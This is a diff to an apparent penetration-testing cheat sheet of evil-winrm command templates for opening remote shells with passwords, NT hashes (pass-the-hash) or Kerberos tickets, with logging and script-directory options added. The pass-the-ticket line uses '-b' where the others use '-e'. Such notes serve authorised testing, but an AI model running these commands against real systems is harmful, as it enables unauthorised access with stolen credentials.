@@ -32,17 +32,17 @@ evil-winrm -i <ip> -u <user> -p '<password>' --ssl -Port 5986
 
 ## domain account with creds
 ```bash
-evil-winrm -i <ip> -u '<domain_netbios>\<user>' -p '<password>'
+(cd /opt/evil-winrm && evil-winrm --log -i <ip> -u '<domain_netbios>\<user>' -p '<password>' -s /opt/evil-winrm/ps -e /opt/evil-winrm/bin) 
 ```
 
 ## local account pth
 ```bash
-evil-winrm -i <ip> -u <user> -H <nt_hash>
+(cd /opt/evil-winrm && evil-winrm --log -i <ip> -u <user> -H <nt_hash> -s /opt/evil-winrm/ps -e /opt/evil-winrm/bin)
 ```
 
 ## domain account pth
 ```bash
-evil-winrm -i <ip> -u '<domain_netbios>\<user>' -H <nt_hash>
+(cd /opt/evil-winrm && evil-winrm --log -i <ip> -u '<domain_netbios>\<user>' -H <nt_hash> -s /opt/evil-winrm/ps -e /opt/evil-winrm/bin)
 ```
 
 ## pass the ticket
@@ -54,5 +54,5 @@ CONTOSO.COM = {
              kdc = fooserver.contoso.com
  }
 ```bash
-export KRB5CCNAME=<ccache> && evil-winrm -i <target_fqdn>  --realm <REALM_FQDN>
+(cd /opt/evil-winrm && export KRB5CCNAME=<ccache> && evil-winrm --log -i <target_fqdn>  --realm <REALM_FQDN> -s /opt/evil-winrm/ps -b /opt/evil-winrm/bin)
 ```
